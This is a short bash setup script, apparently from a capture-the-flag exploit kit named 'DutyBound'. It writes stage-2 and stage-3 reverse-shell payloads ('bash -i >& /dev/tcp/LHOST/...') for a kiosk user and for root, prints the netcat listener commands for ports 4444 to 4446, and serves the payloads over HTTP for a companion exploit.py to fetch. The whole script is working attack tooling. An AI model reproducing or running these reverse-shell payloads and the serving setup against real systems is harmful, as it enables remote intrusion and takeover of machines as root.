#!/bin/bash
# DutyBound — generates the stage-2/3 reverse-shell scripts for your LHOST
# and serves them over HTTP (port 8000). Stage 1 is handled inline by
# exploit.py and needs no HTTP.
#
# usage: ./setup.sh <LHOST> [serve-dir]
#   e.g. ./setup.sh 10.10.14.95
set -euo pipefail

LHOST="${1:?usage: $0 <lhost> [serve-dir]}"
DIR="${2:-$(cd "$(dirname "$0")" && pwd)}"
PORT="${PORT:-8000}"

printf '/bin/bash -i >& /dev/tcp/%s/4445 0>&1\n' "$LHOST" > "$DIR/user.sh"
printf '#!/bin/bash\nbash -i >& /dev/tcp/%s/4446 0>&1\n' "$LHOST" > "$DIR/root.sh"
chmod +x "$DIR/root.sh"

echo "[*] wrote $DIR/user.sh (kiosk, port 4445)"
echo "[*] wrote $DIR/root.sh (root,   port 4446)"
echo "[*] start listeners:  nc -lvnp 4444   # postgres"
echo "                      nc -lvnp 4445   # dutyfree-kiosk"
echo "                      nc -lvnp 4446   # root"
echo "[*] serving $DIR on 0.0.0.0:$PORT"
exec python3 -m http.server "$PORT" --directory "$DIR"
